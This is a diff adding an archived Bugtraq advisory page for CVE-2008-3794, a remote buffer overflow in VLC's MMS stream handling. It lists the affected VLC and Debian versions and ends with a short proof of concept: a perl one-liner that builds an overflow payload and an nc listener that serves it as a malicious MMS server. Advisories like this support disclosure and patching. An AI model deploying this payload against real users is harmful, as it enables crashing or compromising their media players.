@@ -1,0 +1,145 @@
+#SpeeDr00t@Black Falcon<br>#bid30806<p><b><span style="font-size: 18pt;">VLC Media Player 'mmstu.c' MMS Protocol Handling Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/30806/info">info</a><br><a href="http://www.securityfocus.com/bid/30806/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/30806/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/30806/solution">solution</a><br><a href="http://www.securityfocus.com/bid/30806/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				30806
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-3794<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 24 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 18 2009 08:19PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				g_
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					VideoLAN VLC media player 0.8.6 i<br/>
+					
+				
+					Pardus Linux 2008  0<br/>
+					
+				
+					Gentoo Linux  <br/>
+					
+				
+					Debian Linux  4.0 sparc<br/>
+					
+				
+					Debian Linux  4.0 s/390<br/>
+					
+				
+					Debian Linux  4.0 powerpc<br/>
+					
+				
+					Debian Linux  4.0 mipsel<br/>
+					
+				
+					Debian Linux  4.0 mips<br/>
+					
+				
+					Debian Linux  4.0 m68k<br/>
+					
+				
+					Debian Linux  4.0 ia-64<br/>
+					
+				
+					Debian Linux  4.0 ia-32<br/>
+					
+				
+					Debian Linux  4.0 hppa<br/>
+					
+				
+					Debian Linux  4.0 armel<br/>
+					
+				
+					Debian Linux  4.0 arm<br/>
+					
+				
+					Debian Linux  4.0 amd64<br/>
+					
+				
+					Debian Linux  4.0 alpha<br/>
+					
+				
+					Debian Linux  4.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit this issue by enticing an unsuspecting user to open a malicious MMS stream with the vulnerable application.<br/><br/>The following proof of concept to create a malicious server is available:<br/><br/>perl -e 'print "aaaa\xce\xfa\x0b\xb0\xef\xff\xef\xff"; print "a"x100' &amp;gt; headshot<br/>nc -l -v -p 1755 &amp;lt; headshot
+	
+		<ul>
+</ul>
+</div>
